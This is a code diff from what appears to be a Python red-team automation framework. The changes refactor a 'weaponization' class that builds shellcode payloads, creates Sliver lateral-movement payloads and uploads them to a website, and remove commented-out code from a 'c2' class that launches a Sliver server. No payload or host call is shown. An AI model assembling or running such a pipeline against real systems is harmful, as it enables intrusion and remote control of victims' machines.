@@ -125,9 +125,9 @@ class weaponization:
         self.shellcode = None
         self.payload = None
 
+        self.create_payload_for_lateral_movement(self.payload_for_lateral_movement)
         data_in_shellcode_file = self.create_shellcode(self.temp_shellcode_path)
         data_in_payload_file = self.load_payload_template(self.payload_template)
-        data_payload_for_lateral_movement = self.create_payload_for_lateral_movement(self.payload_for_lateral_movement)
 
         self.update_shellcode_in_payload(data_in_shellcode_file, data_in_payload_file)
         self.upload_to_website(self.payload_path)
@@ -194,9 +194,6 @@ class weaponization:
         script_path = "./tools/sliver/create_payload_for_lateral_movement.sh"
 
         # Check if file_path exists and delete if it does
-        # full_file_name = file_path+".exe"
-        # if os.path.exists(full_file_name):
-        #     os.remove(full_file_name)
         if os.path.exists(file_path):
             os.remove(file_path)
             print(f"Old payload at {file_path} has been deleted.")
@@ -206,8 +203,11 @@ class weaponization:
             # Call the function to run the shell script
             self.run_shell_script(script_path, file_path)
             print("prepare payload successfully!")
+            return True
         except Exception as e:
             print(f"An error occurred: {e}")
+
+        return False
 
     def update_shellcode_in_payload(self, shellcode, payload):
         self.shellcode = shellcode
@@ -244,20 +244,6 @@ class weaponization:
         os.remove(ps_file_path)
 
         return zip_file_path
-
-    # def zip_ps1_file(self, ps1_file_path):
-    #     # Extract directory and file name from the given path
-    #     directory, file_name = os.path.split(ps1_file_path)
-
-    #     # Create a zip file with the same name as the PS1 file
-    #     zip_file_path = os.path.join(directory, f"{file_name}.zip")
-
-    #     # Create a ZipFile object to write to
-    #     with zipfile.ZipFile(zip_file_path, 'w') as zipf:
-    #         # Add the PS1 file to the zip archive
-    #         zipf.write(ps1_file_path, arcname=file_name)
-
-    #     return zip_file_path    
 
     def clear_phase(self):
         # check shell code
@@ -432,26 +418,6 @@ class c2:
 
         except subprocess.CalledProcessError as e:
             print(f"Error executing sliver-server command: {e}")
-
-    # def start_sliver_server(self):
-    #     script_path = "./tools/sliver/run_custom_sliver.sh"
-        # try:
-        #     # Change permissions of get_configs.sh to make it executable
-        #     subprocess.run(["chmod", "+x", script_path], check=True)
-
-        #     # Run the shell script
-        #     subprocess.run(["expect", script_path], check=True)
-        #     # # Run the shell script silently
-        #     # subprocess.run(["bash", script_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        #     # Send comment "session" to the terminal every 10 seconds
-        #     # while True:
-        #     #     subprocess.run(["echo", "# session"], check=True)
-        #     #     time.sleep(10)
-
-        #     # print("Shell script executed successfully.")
-        # except subprocess.CalledProcessError as e:
-        #     print(f"Error executing shell script: {e}")
 
 def main():
     list_phase = []
